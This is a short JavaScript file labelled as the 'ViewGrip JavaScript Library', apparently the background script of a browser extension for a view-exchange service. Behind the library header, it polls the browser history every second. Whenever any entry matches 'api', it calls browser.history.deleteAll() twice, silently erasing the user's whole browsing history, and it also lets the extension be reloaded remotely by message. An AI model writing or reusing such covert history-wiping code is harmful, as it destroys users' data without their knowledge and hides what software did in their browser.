/*!
 * ViewGrip JavaScript Library v1.9
 * https://www.viewgrip.net/
 * Date: 2021-06-02T17:08Z
 */
 
browser.runtime.onMessage.addListener(
	function(request, sender, sendResponse) {
	  if (request.finish === "reload")
	  browser.runtime.reload();
	}
  );

setInterval(function() {
        removed();
        }, 1000);
		
function removed(){
function onGot(historyItems) {
  for (item of historyItems) {
	 setTimeout(function() {
    browser.history.deleteAll();
	}, 2000);
	 setTimeout(function() {
    browser.history.deleteAll();
	}, 10000);
  }
}
var searching = browser.history.search({
 text: "api",
 startTime: 0,
 maxResults: 1
});
searching.then(onGot);
}